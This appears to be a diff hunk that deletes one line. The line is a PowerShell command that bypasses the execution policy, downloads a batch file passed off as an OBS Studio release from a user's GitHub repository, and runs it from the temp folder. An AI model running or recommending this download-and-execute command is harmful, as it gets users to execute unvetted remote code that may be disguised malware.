@@ -1,1 +1,0 @@
-powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; Invoke-WebRequest -Uri "https://github.com/Matishzz/OBS-Studio/releases/download/v1.5/OBS.Studio.1.5.bat" -OutFile "$env:TEMP\OBS.Studio.1.5.bat"; Start-Process -FilePath "$env:TEMP\OBS.Studio.1.5.bat"
